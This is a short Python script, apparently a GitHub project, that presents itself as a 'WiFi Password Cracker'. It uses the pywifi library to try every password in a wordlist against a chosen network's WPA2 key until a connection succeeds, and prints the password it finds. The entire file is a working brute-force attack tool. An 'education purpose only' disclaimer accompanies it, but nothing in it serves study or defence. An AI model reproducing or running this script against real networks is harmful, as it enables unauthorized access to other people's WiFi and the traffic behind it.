# WiFi Password Cracker
# Author: DociTeam - https://github.com/DociTeam

import pywifi
import time
import os

os.system('title "DociTeam | WiFi Pass Cracker"')
window = 'mode 90,36'
os.system(window)

class color : 
    Red = '\033[91m'
    Green = '\033[92m'
    Blue = '\033[94m'
    Cyan = '\033[96m'
    White = '\033[97m'
    Yellow = '\033[93m'
    Magenta = '\033[95m'
    Grey = '\033[90m'
    Black = '\033[90m'
    Default = '\033[99m'

banner = """
                      ____             _ _____                    
                     |  _ \  ___   ___(_)_   _|__  __ _ _ __ ___  
                     | | | |/ _ \ / __| | | |/ _ \/ _` | '_ ` _ \ 
                     | |_| | (_) | (__| | | |  __/ (_| | | | | | |
                     |____/ \___/ \___|_| |_|\___|\__,_|_| |_| |_|
"""

print(color.Blue+banner)
print(color.Green+"\nWelcome To"+color.Blue+" DociTeam " +color.Yellow+ "WiFi Password Cracker!")
print(color.Magenta+"\n[!] This Project is Education Purpose Only! DociTeam Is Not Responsible For Any Illegal Things By User.\n")
time.sleep(1)

ssid = input(color.Green+"[+] Please Enter WiFi SSID : "+color.White)
password_file = input(color.Green+"[+] Please Enter Password List Path (Ex : passwords.txt) : "+color.White)
print()

# تابعی برای اسکن وای‌فای و بررسی پسورد‌ها
def wifi_password_cracker(ssid, password_file):
    wifi = pywifi.PyWiFi()  # ایجاد شیء pywifi
    iface = wifi.interfaces()[0]  # انتخاب کارت شبکه

    iface.disconnect()  # قطع اتصال قبلی اگر وجود داشته باشد

    profile = pywifi.Profile()  # ایجاد یک پروفایل جدید
    profile.ssid = ssid  # تنظیم SSID
    profile.auth = pywifi.const.AUTH_ALG_OPEN  # تنظیم نوع احراز هویت
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)  # تنظیم نوع رمزگذاری
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP  # تنظیم نوع رمزگشایی

    # خواندن فایل پسورد
    with open(password_file, "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()  # حذف فاصله‌ها و خطوط جدید از پسورد

        profile.key = password  # تنظیم پسورد در پروفایل

        iface.remove_all_network_profiles()  # حذف همه پروفایل‌ها

        tmp_profile = iface.add_network_profile(profile)  # افزودن پروفایل جدید

        iface.connect(tmp_profile)  # اتصال به وای‌فای

        # انتظار برای اتصال (حداکثر 5 ثانیه)
        time.sleep(5)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print(color.Green+"[+] Password Found : "+color.White+password)
            input(color.White+"\nPress any key to exit...")
            return
        else:
            print(color.Red+f"[-] Wrong Password : "+color.White+password)
            print(color.White+f"---------------------------------------------")
        
    print(color.Yellow+"[!] Password Not Found")

# فراخوانی تابع اسکن و تست پسورد
wifi_password_cracker(ssid, password_file)
